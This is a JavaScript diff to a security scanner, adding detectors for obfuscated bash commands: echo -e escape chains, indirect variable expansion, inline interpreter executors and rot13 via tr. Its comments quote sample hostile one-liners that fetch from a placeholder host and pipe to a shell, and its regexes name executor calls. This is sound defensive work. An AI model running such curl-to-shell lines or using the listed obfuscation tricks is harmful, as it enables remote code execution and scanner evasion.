@@ -739,6 +739,179 @@ Object.assign(EncodedContentDetector.prototype, {
       });
     }
 
+    // ── B7: `echo -e` hex/octal executor ────────────────────────
+    //
+    // `echo -e '\x77\x68\x6f\x61\x6d\x69'` / `echo -e '\167\150…'`.
+    // Mirror of B3 (printf chain) but uses echo's `-e` interpret-
+    // escapes flag. Accept both `\xNN` and `\NNN` (octal) forms in
+    // the same literal. Decoded payload is gated against
+    // SENSITIVE_BASH_KEYWORDS to suppress cases like
+    // `echo -e 'hello\nworld'` which are ubiquitous in build scripts.
+    const echoERe = /\becho\s+(?:-[eE]+|-[neE]+e[neE]*)\s+(['"])((?:\\x[0-9A-Fa-f]{2}|\\[0-7]{1,3}|[^'"\\\r\n]){4,2048})\1/g;
+    while ((m = echoERe.exec(text)) !== null) {
+      throwIfAborted();
+      if (candidates.length >= this.maxCandidatesPerType) break;
+      const body = m[2];
+      let decoded = '';
+      let escapeCount = 0;
+      let i = 0;
+      while (i < body.length) {
+        if (body[i] === '\\' && body[i + 1] === 'x'
+            && /^[0-9A-Fa-f]{2}$/.test(body.slice(i + 2, i + 4))) {
+          decoded += String.fromCharCode(parseInt(body.slice(i + 2, i + 4), 16));
+          i += 4;
+          escapeCount++;
+        } else if (body[i] === '\\' && /^[0-7]{1,3}$/.test(body.slice(i + 1, i + 4))) {
+          // Greedy octal match up to 3 digits — echo -e semantics.
+          let end = i + 2;
+          while (end < i + 4 && end <= body.length && /^[0-7]$/.test(body[end])) end++;
+          decoded += String.fromCharCode(parseInt(body.slice(i + 1, end), 8));
+          i = end;
+          escapeCount++;
+        } else {
+          decoded += body[i];
+          i++;
+        }
+      }
+      // Require ≥3 escapes — lone `\n`/`\t` in a normal echo is not
+      // obfuscation. The gate also skips base64-y literals that happen
+      // to contain a stray `\xNN` run.
+      if (escapeCount < 3) continue;
+      if (!this._bruteforce && !SENSITIVE_BASH_KEYWORDS.test(decoded)) continue;
+      const clipped = _clipDeobfToAmpBudget(decoded, m[0]);
+      candidates.push({
+        type: 'cmd-obfuscation',
+        technique: 'Bash echo -e Escape Chain',
+        raw: m[0],
+        offset: m.index,
+        length: m[0].length,
+        deobfuscated: clipped,
+      });
+    }
+
+    // ── B8: `${!var}` indirect variable expansion ────────────────
+    //
+    //   a=whoami
+    //   b=a
+    //   ${!b}              →  resolves to ${a} → "whoami"
+    //   eval "${!b}"       →  common guise
+    //
+    // Two-hop resolution: `!var` means "use the value of `var` as
+    // the NAME of the variable to expand". Only surface when the
+    // final resolved value looks command-shaped.
+    const indirectRe = /\$\{!([A-Za-z_]\w{0,63})\}/g;
+    while ((m = indirectRe.exec(text)) !== null) {
+      throwIfAborted();
+      if (candidates.length >= this.maxCandidatesPerType) break;
+      const pointerName = m[1];
+      const pointerValue = vars[pointerName];
+      if (typeof pointerValue !== 'string') continue;
+      // Pointer value must itself be a valid bash identifier — that's
+      // the whole point of indirect expansion. Reject anything that
+      // isn't (suppresses `${!MYOPTS[@]}` array-key form which is a
+      // different feature we don't resolve).
+      if (!/^[A-Za-z_]\w{0,63}$/.test(pointerValue)) continue;
+      const finalValue = vars[pointerValue];
+      if (typeof finalValue !== 'string' || finalValue.length < 2) continue;
+      if (!this._bruteforce && !SENSITIVE_BASH_KEYWORDS.test(finalValue)) continue;
+      const clipped = _clipDeobfToAmpBudget(finalValue, m[0]);
+      candidates.push({
+        type: 'cmd-obfuscation',
+        technique: 'Bash Indirect Variable Expansion',
+        raw: m[0],
+        offset: m.index,
+        length: m[0].length,
+        deobfuscated: clipped,
+      });
+    }
+
+    // ── B9: inline-interpreter executor ──────────────────────────
+    //
+    //   awk 'BEGIN{system("curl http://x|sh")}'
+    //   perl -e 'system("curl http://x|sh")'
+    //   python -c 'import os; os.system("curl http://x|sh")'
+    //   python3 -c "exec('…')"
+    //   ruby  -e 'exec("curl http://x|sh")'
+    //   node  -e 'require("child_process").exec("curl http://x|sh")'
+    //
+    // These are bash-hosted executors that invoke another interpreter
+    // to escape downstream signature-matching on `bash`/`sh`. We
+    // surface the inline script body as the deobfuscated payload and
+    // let the post-processor re-scan it through the cross-shell
+    // resolver.
+    //
+    // Regex is two-pass: a cheap anchor (`interpreter [flag] `)
+    // followed by a bounded quoted-body capture. The outer alternation
+    // is flat — no nested quantifiers — to stay ReDoS-safe. Recognised
+    // flags: `-e` (perl/ruby/node/awk), `-c` (python{,3}/bash), `-r`
+    // (php), or bare (awk invokes its script as the first positional
+    // arg without a flag).
+    const interpRe = /\b(awk|perl|python3?|ruby|node|php)(?:\s+-[ercR]|\s+)\s*(['"])((?:\\.|(?!\2).){3,4096})\2/gi;
+    while ((m = interpRe.exec(text)) !== null) {
+      throwIfAborted();
+      if (candidates.length >= this.maxCandidatesPerType) break;
+      const interp = m[1].toLowerCase();
+      const body = m[3];
+      // Post-decode plausibility: the inline body must call something
+      // that looks like an executor (system / exec / os.system /
+      // subprocess / `sh`/`bash`/`curl`/`wget`). Otherwise we'd flag
+      // every legitimate `awk -e '{print $2}'` in build scripts.
+      const bodyExec = /\b(?:system|exec(?:ve|cl|lp)?|os\.system|subprocess|popen|child_process|shell_exec|passthru|Kernel\.|IO\.popen|open\s*\(\s*['"][|])/i;
+      if (!this._bruteforce && !bodyExec.test(body)
+          && !SENSITIVE_BASH_KEYWORDS.test(body)) continue;
+      const clipped = _clipDeobfToAmpBudget(body, m[0]);
+      candidates.push({
+        type: 'cmd-obfuscation',
+        technique: `Bash Inline ${interp} Executor`,
+        raw: m[0],
+        offset: m.index,
+        length: m[0].length,
+        deobfuscated: clipped,
+      });
+    }
+
+    // ── B10: tr substitution cipher via here-string ──────────────
+    //
+    //   tr 'A-Za-z' 'N-ZA-Mn-za-m' <<< 'jrnzvxrrg'   →  rot13 → "whoami…"
+    //   tr 'N-ZA-Mn-za-m' 'A-Za-z' <<< 'jrnzvxrrg'   →  rot13 (reversed)
+    //   echo 'jrnzvxrrg' | tr 'A-Za-z' 'N-ZA-Mn-za-m'
+    //
+    // Only the two rot13 orientations are resolved here; arbitrary
+    // tr(1) translate-sets are too flexible to statically simulate
+    // without a real tr engine. The post-decode gate still applies.
+    const tr13Re = /\btr\s+(['"])([A-Za-z-]+)\1\s+(['"])([A-Za-z-]+)\3\s+<<<\s*(['"])([^'"\r\n]{4,2048})\5/g;
+    while ((m = tr13Re.exec(text)) !== null) {
+      throwIfAborted();
+      if (candidates.length >= this.maxCandidatesPerType) break;
+      const setFrom = m[2];
+      const setTo = m[4];
+      const input = m[6];
+      // Recognise rot13 orientation by canonical set pair; anything
+      // else is too generic to statically resolve.
+      const isRot13 = (setFrom === 'A-Za-z' && setTo === 'N-ZA-Mn-za-m')
+                   || (setFrom === 'N-ZA-Mn-za-m' && setTo === 'A-Za-z')
+                   || (setFrom === 'a-zA-Z' && setTo === 'n-za-mN-ZA-M')
+                   || (setFrom === 'n-za-mN-ZA-M' && setTo === 'a-zA-Z');
+      if (!isRot13) continue;
+      let decoded = '';
+      for (let j = 0; j < input.length; j++) {
+        const c = input.charCodeAt(j);
+        if (c >= 65 && c <= 90)      decoded += String.fromCharCode(((c - 65 + 13) % 26) + 65);
+        else if (c >= 97 && c <= 122) decoded += String.fromCharCode(((c - 97 + 13) % 26) + 97);
+        else                          decoded += input[j];
+      }
+      if (!this._bruteforce && !SENSITIVE_BASH_KEYWORDS.test(decoded)) continue;
+      const clipped = _clipDeobfToAmpBudget(decoded, m[0]);
+      candidates.push({
+        type: 'cmd-obfuscation',
+        technique: 'Bash tr rot13 Here-String',
+        raw: m[0],
+        offset: m.index,
+        length: m[0].length,
+        deobfuscated: clipped,
+      });
+    }
+
     return candidates;
   },
 });
